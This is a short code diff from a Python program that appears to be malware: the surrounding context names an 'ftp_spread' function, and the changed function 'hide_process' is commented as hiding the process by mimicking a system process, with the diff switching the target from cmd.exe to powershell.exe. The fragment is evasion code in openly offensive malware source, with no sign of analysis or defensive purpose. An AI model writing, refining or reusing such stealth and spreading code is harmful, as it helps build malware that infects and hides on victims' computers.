@@ -211,11 +211,11 @@ def ftp_spread():
     except:
         pass
 
-# Hide process by mimicking cmd.exe
+# Hide process by mimicking powershell.exe
 def hide_process():
     try:
         for proc in psutil.process_iter(['name']):
-            if proc.info['name'].lower() == 'cmd.exe':
+            if proc.info['name'].lower() == 'powershell.exe':
                 os.environ['COMSPEC'] = proc.exe()
                 break
     except:
